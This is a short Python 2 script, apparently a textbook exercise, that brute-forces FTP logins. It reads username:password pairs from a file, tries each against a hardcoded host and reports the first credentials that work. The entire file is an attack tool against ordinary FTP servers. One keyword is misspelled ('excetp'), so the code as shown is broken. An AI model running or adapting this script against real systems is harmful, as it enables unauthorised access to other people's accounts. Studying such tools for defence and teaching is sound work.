#!/usr/bin/env python
import ftplib
host = '192.168.95.179'
passwdFile = 'userpass.txt'

def banner():
	print "########    BruteLogin p 58   ########"
	print "bruteLogin.py"

def bruteLogin(hostname, passwdFile):
	pF = open(passwdFile, 'r')
	for line in pF.readlines():
		userName = line.split(':')[0]
		passWord = line.split(':')[1].strip('\n')
		print '\n[*] Trying: '+userName+"/"+passWord
		try:
			ftp = ftplib.FTP(hostname)
			ftp.login(userName, passWord)
			print '\n[*] '+str(hostname)+' FTP Logon Succeded: '+userName+'/'+passWord
			ftp.quit()
			return (userName, passWord)
		excetp Exception, e:
			pass
	print '\n[-] Could not brute force FTP credentials.'
	return (None, None)

bruteLogin(host, passwdFile)